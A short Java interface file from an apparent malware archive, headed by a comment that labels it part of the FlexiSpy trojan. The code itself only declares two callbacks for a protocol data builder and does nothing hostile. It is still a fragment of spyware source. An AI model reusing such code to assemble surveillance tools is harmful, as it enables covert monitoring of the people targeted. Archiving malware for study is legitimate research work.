/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.prot.databuilder;

public interface ProtocolDataBuilderListener {
	public void onProtocolBuilderError(String err);
	public void onProtocolBuilderSuccess(ProtocolPacketBuilderResponse protData);
}